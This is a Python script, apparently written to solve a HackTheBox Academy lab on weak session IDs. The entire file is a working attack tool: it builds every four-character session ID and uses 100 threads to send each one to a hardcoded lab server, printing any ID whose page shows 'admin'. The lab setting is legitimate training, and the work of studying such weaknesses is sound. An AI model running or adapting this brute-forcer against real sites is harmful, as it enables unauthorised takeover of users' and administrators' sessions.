#!/usr/bin/env python3
"""
Created this script to solve the HackTheBox Academy lab called 'Weak Session IDs' for the module called 'Abusing HTTP Misconfigurations'
This script brute forces a weak sessionID length
"""

import requests
import string
import itertools
import concurrent.futures

# Create a list that will be used for the cookie sessionID value
def cookielist():
    charlist= string.digits + string.ascii_lowercase
    combinations= itertools.product(charlist, repeat=4)
    cookie= [''.join(combination) for combination in combinations]
    return cookie

# Brute force the sessionID
def bf_cookie(cookie):
    target= "94.237.59.63:49393"
    proxies= {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
    headers= {"foo":"bar"}
    cookies= {"sessionID":f"{cookie}"}
    response= requests.get(url=f"http://{target}/profile.php", headers=headers, proxies=proxies, cookies=cookies, verify=False, allow_redirects=False)
    if "admin" in response.text:
        return cookie
    else:
        return None

# Increase brute force speed by using multithreading 
def fast_bf_cookie():
    cookie_list= cookielist()
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        future_to_test= {executor.submit(bf_cookie, cookie): cookie for cookie in cookie_list}
        for future in concurrent.futures.as_completed(future_to_test):          
            result= future.result()
            if result is not None:
                print(f"{result}") 
        
try:
    fast_bf_cookie()
except KeyboardInterrupt:
    print(f"ctrl +c detected, exiting gracefully...")
        
